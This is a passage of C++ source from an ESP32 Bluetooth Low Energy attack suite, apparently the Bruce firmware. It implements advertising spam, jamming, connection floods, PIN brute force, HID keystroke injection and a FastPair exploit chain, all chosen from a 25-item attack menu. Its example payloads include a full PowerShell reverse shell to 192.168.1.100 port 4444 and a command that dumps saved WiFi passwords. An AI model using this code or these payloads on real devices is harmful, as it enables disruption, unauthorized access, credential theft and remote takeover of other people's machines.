    else showAttackResult(false, "Flood attack failed");
    return anySuccess;
}

bool MultiConnectionAttack::advertisingSpamSingle(NimBLEAddress target) {
    NimBLEDevice::deinit(true);
    delay(300);
    std::string spamName = "Bruce-Spammer";
    NimBLEDevice::init(spamName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if(!pAdvertising) return false;

    uint8_t bruceData[] = {0xFF, 0xFF, 'B', 'R', 'U', 'C', 'E'};
    pAdvertising->setManufacturerData(bruceData, sizeof(bruceData));
    pAdvertising->setName("Bruce-Spammer");
    pAdvertising->addServiceUUID(NimBLEUUID("12345678-1234-5678-1234-567812345678"));

    pAdvertising->start(0);
    delay(100);
    pAdvertising->stop();
    return true;
}

bool MultiConnectionAttack::advertisingSpam(std::vector<NimBLEAddress> targets) {
    if(!confirmAttack("WARNING: This will spam BLE ads. Continue?")) return false;
    showAttackProgress("Starting advertising spam...", TFT_ORANGE);

    const int SPAM_DURATION = 10000;
    unsigned long startTime = millis();
    int spamCount = 0;

    while(millis() - startTime < SPAM_DURATION) {
        if(check(EscPress)) break;
        for(auto& target : targets) advertisingSpamSingle(target);
        spamCount++;
        if(spamCount % 10 == 0) showAttackProgress(String("Spammed " + String(spamCount) + " advertisements").c_str(), TFT_YELLOW);
        delay(150);
    }

    NimBLEDevice::deinit(true);
    showAttackResult(true, String("Sent " + String(spamCount) + " spam advertisements").c_str());
    return true;
}

bool MultiConnectionAttack::mitmAttackSingle(NimBLEAddress target) { return false; }

bool MultiConnectionAttack::mitmAttack(std::vector<NimBLEAddress> targets) {
    showAttackResult(false, "MITM attack not implemented");
    return false;
}

bool MultiConnectionAttack::nrf24JamAttack(int jamMode) {
    if(!confirmAttack("Jam BLE frequencies? This may disrupt nearby devices.")) return false;
    showAttackProgress("Initializing NRF24 for BLE jamming...", TFT_WHITE);

    if(!isNRF24Available()) {
        showAttackResult(false, "NRF24 module not available");
        return false;
    }

    BLEJamMode bleMode;
    switch(jamMode) {
        case 0: bleMode = BLE_JAM_ADV_CHANNELS; break;
        case 1: bleMode = BLE_JAM_HOP_ADV; break;
        case 2: bleMode = BLE_JAM_HOP_ALL; break;
        default: bleMode = BLE_JAM_ADV_CHANNELS;
    }

    showAttackProgress("Starting BLE jamming attack...", TFT_ORANGE);
    bool success = startBLEJammer(bleMode);

    if(success) {
        std::vector<String> lines;
        lines.push_back("BLE JAMMER ACTIVE");
        lines.push_back("Mode: " + String(bleMode == BLE_JAM_ADV_CHANNELS ? "Advertising Channels" : 
                     bleMode == BLE_JAM_HOP_ADV ? "Hopping Adv Channels" : 
                     bleMode == BLE_JAM_HOP_ALL ? "Hopping All BLE Channels" : "Unknown"));
        lines.push_back("");
        lines.push_back("Jamming BLE frequencies");
        lines.push_back("Press any key to stop...");
        showDeviceInfoScreen("BLE JAMMER", lines, TFT_ORANGE, TFT_WHITE);
        stopBLEJammer();
        showAttackResult(true, "BLE jamming stopped");
        return true;
    }
    showAttackResult(false, "Failed to start BLE jamming");
    return false;
}

bool MultiConnectionAttack::jamAndConnect(NimBLEAddress target) {
    if(!confirmAttack("Jam BLE while attempting exploit connection?")) return false;
    showAttackProgress("Jam & Connect attack starting...", TFT_ORANGE);

    bool jamStarted = jamBLEAdvertisingChannels();
    if(!jamStarted) {
        showAttackResult(false, "Failed to start jamming");
        return false;
    }

    delay(300);
    showAttackProgress("Jamming active - attempting connection...", TFT_YELLOW);

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    stopBLEJammer();
    delay(200);

    if(pClient) {
        showAttackProgress("Connected! Testing for exploit...", TFT_GREEN);
        WhisperPairExploit exploit;
        bool exploitSuccess = exploit.executeSilent(target);

        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(exploitSuccess) showAttackResult(true, "Jam & Connect exploit successful!");
        else showAttackResult(true, "Connected but exploit failed");
        return true;
    }
    showAttackResult(false, "Jam & Connect attack failed");
    return false;
}

void MultiConnectionAttack::cleanup() {
    for(auto& client : activeConnections) {
        if(client) {
            client->disconnect();
            NimBLEDevice::deleteClient(client);
        }
    }
    activeConnections.clear();
    NimBLEDevice::deinit(true);
}

VulnerabilityScanner::VulnerabilityScanner() { vulnerabilityChecks.clear(); }

void VulnerabilityScanner::scanDevice(NimBLEAddress target) {
    showAttackProgress("Scanning for vulnerabilities...", TFT_BLUE);
    WhisperPairExploit exploit;
    bool fastPairVuln = exploit.executeSilent(target);

    std::vector<String> lines;
    lines.push_back("VULNERABILITY SCAN REPORT");
    lines.push_back("Target: " + String(target.toString().c_str()));
    lines.push_back("FastPair Buffer Overflow: " + String(fastPairVuln ? "VULNERABLE" : "SAFE"));

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(pClient) {
        bool hasHID = false;
        bool hasAVRCP = false;
        bool writeAccess = false;

        const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
        for(auto& service : services) {
            std::string uuidStr = service->getUUID().toString();
            if(uuidStr.find("1812") != std::string::npos) hasHID = true;
            if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) hasAVRCP = true;

            const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
            for(auto& ch : chars) {
                if(ch->canWrite()) { writeAccess = true; break; }
            }
        }

        lines.push_back("HID Service Present: " + String(hasHID ? "YES" : "NO"));
        lines.push_back("AVRCP Service Present: " + String(hasAVRCP ? "YES" : "NO"));
        lines.push_back("Write Access Available: " + String(writeAccess ? "YES" : "NO"));
        pClient->disconnect();
        NimBLEDevice::deinit(true);
    }

    showDeviceInfoScreen("SCAN RESULTS", lines, TFT_BLUE, TFT_WHITE);
}

void VulnerabilityScanner::addCustomCheck(String name, bool (*checkFunc)(NimBLEAddress), String desc) {
    VulnCheck check;
    check.name = name;
    check.checkFunction = checkFunc;
    check.description = desc;
    vulnerabilityChecks.push_back(check);
}

void VulnerabilityScanner::runAllChecks(NimBLEAddress target) {
    for(auto& check : vulnerabilityChecks) 
        if(check.checkFunction) 
            bool result = check.checkFunction(target);
}

std::vector<String> VulnerabilityScanner::getVulnerabilities() { 
    std::vector<String> vulns; 
    return vulns; 
}

bool HIDAttackServiceClass::injectKeystrokes(NimBLEAddress target) {
    if(!confirmAttack("Attempt HID keystroke injection?")) return false;

    bool hasHFP = false;
    String deviceName = "";
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                deviceName = scannerData.deviceNames[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    if(hasHFP && !deviceName.isEmpty()) {
        showAttackProgress("Trying HFP exploit first...", TFT_CYAN);
        HFPExploitEngine hfp;
        if(hfp.executeHFPAttackChain(target)) {
            showAttackProgress("HFP successful! Proceeding to HID...", TFT_GREEN);
        } else {
            showAttackProgress("HFP failed, trying direct HID...", TFT_ORANGE);
        }
    }

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return false;
    }

    showAttackProgress("Connected! Finding HID service...", TFT_GREEN);
    NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(!pHIDService) {
        showAttackResult(false, "No HID service found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pReportChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
    for(auto& ch : chars) {
        std::string uuidStr = ch->getUUID().toString();
        if((uuidStr.find("2a4d") != std::string::npos || uuidStr.find("2a22") != std::string::npos || uuidStr.find("2a32") != std::string::npos) && ch->canWrite()) {
            pReportChar = ch;
            break;
        }
    }

    if(!pReportChar) {
        showAttackResult(false, "No writable HID characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    bool anySent = false;
    uint8_t enterKey[] = {0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent1 = pReportChar->writeValue(enterKey, sizeof(enterKey), true);
    if(sent1) anySent = true;
    delay(300);

    uint8_t windowsKey[] = {0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent2 = pReportChar->writeValue(windowsKey, sizeof(windowsKey), true);
    if(sent2) anySent = true;
    delay(300);

    uint8_t nullReport[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent3 = pReportChar->writeValue(nullReport, sizeof(nullReport), true);
    if(sent3) anySent = true;

    pClient->disconnect();
    NimBLEDevice::deinit(true);
    delay(300);
    return anySent;
}

bool HIDAttackServiceClass::forceHIDKeystrokes(NimBLEAddress target, const String& deviceName, int rssi) {
    HIDExploitEngine hidExploit;
    HIDConnectionResult connResult = hidExploit.forceHIDConnection(target, deviceName, rssi);

    if(!connResult.success) {
        showAttackResult(false, "Failed to establish HID connection");
        return false;
    }

    NimBLEClient* pClient = nullptr;
    String connectionMethod = "";
    pClient = attemptConnectionWithStrategies(target, connectionMethod);

    if(!pClient) {
        showAttackResult(false, "Failed to create client");
        return false;
    }

    NimBLERemoteService* pHIDService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(!pHIDService) {
        showAttackResult(false, "No HID service found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    NimBLERemoteCharacteristic* pReportChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pHIDService->getCharacteristics(true);
    for(auto& ch : chars) {
        std::string uuidStr = ch->getUUID().toString();
        if((uuidStr.find("2a4d") != std::string::npos || uuidStr.find("2a22") != std::string::npos || uuidStr.find("2a32") != std::string::npos) && ch->canWrite()) {
            pReportChar = ch;
            break;
        }
    }

    if(!pReportChar) {
        showAttackResult(false, "No writable HID characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return false;
    }

    bool anySent = false;
    uint8_t enterKey[] = {0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent1 = pReportChar->writeValue(enterKey, sizeof(enterKey), true);
    if(sent1) anySent = true;
    delay(300);

    uint8_t windowsKey[] = {0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent2 = pReportChar->writeValue(windowsKey, sizeof(windowsKey), true);
    if(sent2) anySent = true;
    delay(300);

    uint8_t nullReport[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    bool sent3 = pReportChar->writeValue(nullReport, sizeof(nullReport), true);
    if(sent3) anySent = true;

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
    delay(300);

    if(anySent) showAttackResult(true, "Forced HID keystrokes sent!");
    else showAttackResult(false, "Failed to send keystrokes");
    return anySent;
}

bool PairingAttackServiceClass::bruteForcePIN(NimBLEAddress target) {
    if(!confirmAttack("Attempt PIN brute force?")) return false;

    const char* commonPins[] = {
        "0000", "1234", "1111", "2222", "3333",
        "4444", "5555", "6666", "7777", "8888",
        "9999", "1212", "1004", "2000", "3000",
        nullptr
    };

    bool success = false;
    for(int i = 0; commonPins[i] != nullptr; i++) {
        showAttackProgress(String("Trying PIN: " + String(commonPins[i])).c_str(), TFT_YELLOW);

        NimBLEDevice::deinit(true);
        delay(300);
        std::string pinName = "Bruce-PINBrute";
        NimBLEDevice::init(pinName);
        NimBLEDevice::setSecurityAuth(true, true, true);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(5);
            if(pClient->connect(target, true)) {
                showAttackProgress(String("Connected with PIN: " + String(commonPins[i])).c_str(), TFT_GREEN);
                success = true;

                std::vector<String> lines;
                lines.push_back("PIN BRUTE FORCE SUCCESS!");
                lines.push_back(String("Target: ") + String(target.toString().c_str()));
                lines.push_back(String("PIN: ") + String(commonPins[i]));
                lines.push_back("");
                lines.push_back("Device vulnerable to weak");
                lines.push_back("PIN authentication");

                showDeviceInfoScreen("PIN CRACKED", lines, TFT_GREEN, TFT_BLACK);
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                break;
            }
            NimBLEDevice::deleteClient(pClient);
        }
        delay(500);
    }

    NimBLEDevice::deinit(true);
    if(!success) showAttackResult(false, "All common PINs failed");
    return success;
}

bool DoSAttackServiceClass::connectionFlood(NimBLEAddress target) {
    if(!confirmAttack("WARNING: This may disrupt BLE. Continue?")) return false;
    showAttackProgress("Starting connection flood...", TFT_ORANGE);

    bool anySuccess = false;
    const int MAX_ATTEMPTS = 20;
    for(int i = 0; i < MAX_ATTEMPTS; i++) {
        showAttackProgress(String("Flood attempt " + String(i+1) + "/" + String(MAX_ATTEMPTS)).c_str(), TFT_YELLOW);

        NimBLEDevice::deinit(true);
        delay(100);
        std::string floodName = "Bruce-Flooder";
        NimBLEDevice::init(floodName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);

        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(pClient) {
            pClient->setConnectTimeout(2);
            bool connected = pClient->connect(target, false);
            if(connected) anySuccess = true;
            NimBLEDevice::deleteClient(pClient);
        }
        delay(50);
    }

    NimBLEDevice::deinit(true);
    if(anySuccess) showAttackResult(true, "Connection flood completed");
    else showAttackResult(false, "Flood attack failed");
    return anySuccess;
}

bool DoSAttackServiceClass::advertisingSpam(NimBLEAddress target) {
    if(!confirmAttack("WARNING: This will spam BLE ads. Continue?")) return false;
    showAttackProgress("Starting advertising spam...", TFT_ORANGE);

    NimBLEDevice::deinit(true);
    delay(300);
    std::string spamName = "Bruce-Spammer";
    NimBLEDevice::init(spamName);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    if(!pAdvertising) {
        showAttackResult(false, "Failed to get advertising");
        return false;
    }

    uint8_t spamData[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    pAdvertising->setManufacturerData(spamData, sizeof(spamData));
    pAdvertising->setName("Bruce-Spammer");
    pAdvertising->addServiceUUID(NimBLEUUID("12345678-1234-5678-1234-567812345678"));

    const int SPAM_DURATION = 10000;
    unsigned long startTime = millis();
    int spamCount = 0;

    while(millis() - startTime < SPAM_DURATION) {
        if(check(EscPress)) break;
        pAdvertising->start(0);
        delay(100);
        pAdvertising->stop();
        delay(50);
        spamCount++;
        if(spamCount % 10 == 0) showAttackProgress(String("Spammed " + String(spamCount) + " advertisements").c_str(), TFT_YELLOW);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
    showAttackResult(true, String("Sent " + String(spamCount) + " spam advertisements").c_str());
    return true;
}

String selectFileFromSD() {
    if(!SD.begin()) {
        showErrorMessage("SD Card not found");
        return "";
    }
    
    const int MAX_FILES = 30;
    String files[MAX_FILES];
    int fileCount = 0;
    
    File root = SD.open("/");
    if(!root) {
        showErrorMessage("Cannot open SD");
        return "";
    }
    
    File file = root.openNextFile();
    while(file && fileCount < MAX_FILES) {
        String filename = file.name();
        if(!file.isDirectory() && 
           (filename.endsWith(".txt") || filename.endsWith(".ducky") || 
            filename.endsWith(".TXT") || filename.endsWith(".DUCKY"))) {
            files[fileCount++] = filename;
        }
        file = root.openNextFile();
    }
    root.close();
    
    if(fileCount == 0) {
        showErrorMessage("No files found");
        return "";
    }
    
    int selected = 0;
    int scrollOffset = 0;
    bool exitMenu = false;
    int menuStartY = 60;
    int menuItemHeight = 25;
    int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
    if(maxVisibleItems > fileCount) maxVisibleItems = fileCount;
    
    while(!exitMenu) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SD CARD FILES") * 12) / 2, 15);
        tft.print("SD CARD FILES");
        tft.setTextSize(1);
        
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(20, 40);
        tft.print("Found: ");
        tft.print(fileCount);
        tft.print(" files");
        
        for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < fileCount; i++) {
            int fileIdx = scrollOffset + i;
            int yPos = menuStartY + (i * menuItemHeight);
            if(yPos + menuItemHeight > tftHeight - 45) break;
            
            if(fileIdx == selected) {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(25, yPos + 8);
                tft.print("> ");
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(25, yPos + 8);
                tft.print("  ");
            }
            
            String displayName = files[fileIdx];
            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
            tft.print(displayName);
        }
        
        if(fileCount > maxVisibleItems) {
            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
            tft.setCursor(tftWidth - 25, menuStartY + 5);
            if(scrollOffset > 0) tft.print("^");
            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
            if(scrollOffset + maxVisibleItems < fileCount) tft.print("v");
        }
        
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
        
        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                delay(200);
                exitMenu = true;
                return "";
            } else if(check(PrevPress)) {
                delay(150);
                if(selected > 0) {
                    selected--;
                    if(selected < scrollOffset) scrollOffset = selected;
                } else {
                    selected = fileCount - 1;
                    scrollOffset = std::max(0, fileCount - maxVisibleItems);
                }
                inputProcessed = true;
            } else if(check(NextPress)) {
                delay(150);
                if(selected < fileCount - 1) {
                    selected++;
                    if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
                } else {
                    selected = 0;
                    scrollOffset = 0;
                }
                inputProcessed = true;
            } else if(check(SelPress)) {
                delay(200);
                return files[selected];
            }
            if(!inputProcessed) delay(50);
        }
    }
    return "";
}

bool loadScriptFromSD(String filename) {
    if(!SD.begin()) {
        showErrorMessage("SD Card failed");
        return false;
    }
    
    File file = SD.open(filename);
    if(!file) {
        String errorMsg = "Cannot open file: " + filename;
        showErrorMessage(errorMsg.c_str());
        return false;
    }
    
    globalScript = "";
    while(file.available()) {
        globalScript += (char)file.read();
    }
    file.close();
    
    if(globalScript.length() == 0) {
        showErrorMessage("File is empty");
        return false;
    }
    
    return true;
}

String getScriptFromUser() {
    const int MAX_SCRIPTS = 10;
    String scripts[MAX_SCRIPTS];
    int scriptCount = 0;
    
    scripts[scriptCount++] = "Example: Open Calculator";
    scripts[scriptCount++] = "Example: Open CMD/Terminal";
    scripts[scriptCount++] = "Example: WiFi Credentials";
    scripts[scriptCount++] = "Example: Reverse Shell";
    scripts[scriptCount++] = "Example: Rickroll";
    scripts[scriptCount++] = "Load from SD";
    scripts[scriptCount++] = "Cancel";
    
    int selected = 0;
    int scrollOffset = 0;
    bool exitMenu = false;
    int menuStartY = 60;
    int menuItemHeight = 25;
    int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
    if(maxVisibleItems > scriptCount) maxVisibleItems = scriptCount;
    
    while(!exitMenu) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SELECT SCRIPT") * 12) / 2, 15);
        tft.print("SELECT SCRIPT");
        tft.setTextSize(1);
        
        for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < scriptCount; i++) {
            int scriptIdx = scrollOffset + i;
            int yPos = menuStartY + (i * menuItemHeight);
            if(yPos + menuItemHeight > tftHeight - 45) break;
            
            if(scriptIdx == selected) {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(25, yPos + 8);
                tft.print("> ");
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(25, yPos + 8);
                tft.print("  ");
            }
            
            String displayName = scripts[scriptIdx];
            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
            tft.print(displayName);
        }
        
        if(scriptCount > maxVisibleItems) {
            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
            tft.setCursor(tftWidth - 25, menuStartY + 5);
            if(scrollOffset > 0) tft.print("^");
            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
            if(scrollOffset + maxVisibleItems < scriptCount) tft.print("v");
        }
        
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");
        
        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                delay(200);
                exitMenu = true;
                return "";
            } else if(check(PrevPress)) {
                delay(150);
                if(selected > 0) {
                    selected--;
                    if(selected < scrollOffset) scrollOffset = selected;
                } else {
                    selected = scriptCount - 1;
                    scrollOffset = std::max(0, scriptCount - maxVisibleItems);
                }
                inputProcessed = true;
            } else if(check(NextPress)) {
                delay(150);
                if(selected < scriptCount - 1) {
                    selected++;
                    if(selected >= scrollOffset + maxVisibleItems) scrollOffset = selected - maxVisibleItems + 1;
                } else {
                    selected = 0;
                    scrollOffset = 0;
                }
                inputProcessed = true;
            } else if(check(SelPress)) {
                delay(200);
                
                if(selected == scriptCount - 1) {
                    return "";
                } else if(scripts[selected] == "Load from SD") {
                    String filename = selectFileFromSD();
                    if(!filename.isEmpty() && loadScriptFromSD(filename)) {
                        return globalScript;
                    }
                    return "";
                } else if(scripts[selected].startsWith("Example: ")) {
                    String scriptName = scripts[selected].substring(9);
                    if(scriptName == "Open Calculator") {
                        return "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER";
                    } else if(scriptName == "Open CMD/Terminal") {
                        #ifdef WINDOWS
                        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
                        #else
                        return "GUI\nDELAY 500\nSTRING terminal\nDELAY 300\nENTER";
                        #endif
                    } else if(scriptName == "WiFi Credentials") {
                        return "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER";
                    } else if(scriptName == "Reverse Shell") {
                        return "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER";
                    } else if(scriptName == "Rickroll") {
                        return "GUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nDELAY 300\nENTER";
                    }
                }
                
                inputProcessed = true;
            }
            if(!inputProcessed) delay(50);
        }
    }
    return "";
}

void BleSuiteMenu() {
    String targetInfo = selectTargetFromScan("SELECT TARGET");
    if(targetInfo.isEmpty()) return;
    NimBLEAddress target = parseAddress(targetInfo);
    if(!requireSimpleConfirmation("Attack this device?")) return;
    showAttackMenuWithTarget(target);
}

void showAttackMenuWithTarget(NimBLEAddress target) {
    const int MAX_ATTACKS = 25;
    const char* attackNames[] = {
        "FastPair Buffer Overflow",
        "Advanced Protocol Attack",
        "Audio Stack Crash",
        "Media Control Hijack",
        "HID Keystroke Injection",
        "Ducky Script Injection",
        "PIN Brute Force",
        "Connection Flood DoS",
        "Advertising Spam",
        "Quick Test (silent)",
        "Device Profiling",
        "Test Write Access",
        "Protocol Fuzzer",
        "Jam & Connect Attack",
        "Test HID Services",
        "Audio Control Test",
        "Vulnerability Scan",
        "Force HID Injection",
        "HID Connection Exploit",
        "Advanced Ducky Injection",
        "HID Vulnerability Test",
        "HFP Vulnerability Test",
        "HFP Attack Chain",
        "HFP → HID Pivot Attack",
        "Universal Attack Chain"
    };

    int selectedAttack = 0;
    int scrollOffset = 0;
    bool exitMenu = false;
    int menuStartY = 60;
    int menuItemHeight = 25;
    int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
    if(maxVisibleItems > MAX_ATTACKS) maxVisibleItems = MAX_ATTACKS;

    while(!exitMenu) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("BLE SUITE") * 12) / 2, 15);
        tft.print("BLE SUITE");
        tft.setTextSize(1);

        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(20, 40);
        tft.print("Target: ");
        String targetStr = target.toString().c_str();
        if(targetStr.length() > 22) targetStr = targetStr.substring(0, 19) + "...";
        tft.println(targetStr);

        for(int i = 0; i < maxVisibleItems && (scrollOffset + i) < MAX_ATTACKS; i++) {
            int attackIdx = scrollOffset + i;
            int yPos = menuStartY + (i * menuItemHeight);
            if(yPos + menuItemHeight > tftHeight - 45) break;

            if(attackIdx == selectedAttack) {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(25, yPos + 8);
                tft.print("> ");
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, menuItemHeight - 3, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(25, yPos + 8);
                tft.print("  ");
            }

            String displayName = attackNames[attackIdx];
            if(displayName.length() > 28) displayName = displayName.substring(0, 25) + "...";
            tft.print(displayName);
        }

        if(MAX_ATTACKS > maxVisibleItems) {
            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
            tft.setCursor(tftWidth - 25, menuStartY + 5);
            if(scrollOffset > 0) tft.print("^");
            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleItems * menuItemHeight) - 20);
            if(scrollOffset + maxVisibleItems < MAX_ATTACKS) tft.print("v");
        }

        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");

        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                delay(200);
                exitMenu = true;
                inputProcessed = true;
            } else if(check(PrevPress)) {
                delay(150);
                if(selectedAttack > 0) {
                    selectedAttack--;
                    if(selectedAttack < scrollOffset) scrollOffset = selectedAttack;
                } else {
                    selectedAttack = MAX_ATTACKS - 1;
                    scrollOffset = std::max(0, MAX_ATTACKS - maxVisibleItems);
                }
                inputProcessed = true;
            } else if(check(NextPress)) {
                delay(150);
                if(selectedAttack < MAX_ATTACKS - 1) {
                    selectedAttack++;
                    if(selectedAttack >= scrollOffset + maxVisibleItems) scrollOffset = selectedAttack - maxVisibleItems + 1;
                } else {
                    selectedAttack = 0;
                    scrollOffset = 0;
                }
                inputProcessed = true;
            } else if(check(SelPress)) {
                delay(200);
                executeSelectedAttack(selectedAttack, target);
                exitMenu = true;
                inputProcessed = true;
            }
            if(!inputProcessed) delay(50);
        }
    }
}

void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
    switch(attackIndex) {
        case 0: runWhisperPairAttack(target); break;
        case 1: runAdvancedExploit(target); break;
        case 2: runAudioStackCrash(target); break;
        case 3: runMediaCommandHijack(target); break;
        case 4: runHIDInjection(target); break;
        case 5: runDuckyScriptAttack(target); break;
        case 6: runPINBruteForce(target); break;
        case 7: runConnectionFlood(target); break;
        case 8: runAdvertisingSpam(target); break;
        case 9: runQuickTest(target); break;
        case 10: runDeviceProfiling(target); break;
        case 11: runWriteAccessTest(target); break;
        case 12: runProtocolFuzzer(target); break;
        case 13: runJamConnectAttack(target); break;
        case 14: runHIDTest(target); break;
        case 15: runAudioControlTest(target); break;
        case 16: runVulnerabilityScan(target); break;
        case 17: runForceHIDInjection(target); break;
        case 18: runHIDConnectionExploit(target); break;
        case 19: runAdvancedDuckyInjection(target); break;
        case 20: runHIDVulnerabilityTest(target); break;
        case 21: runHFPVulnerabilityTest(target); break;
        case 22: runHFPAttackChain(target); break;
        case 23: runHFPHIDPivotAttack(target); break;
        case 24: runUniversalAttack(target); break;
    }
}

void runUniversalAttack(NimBLEAddress target) {
    if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
    
    String deviceName = "";
    int rssi = -60;
    bool hasHFP = false;
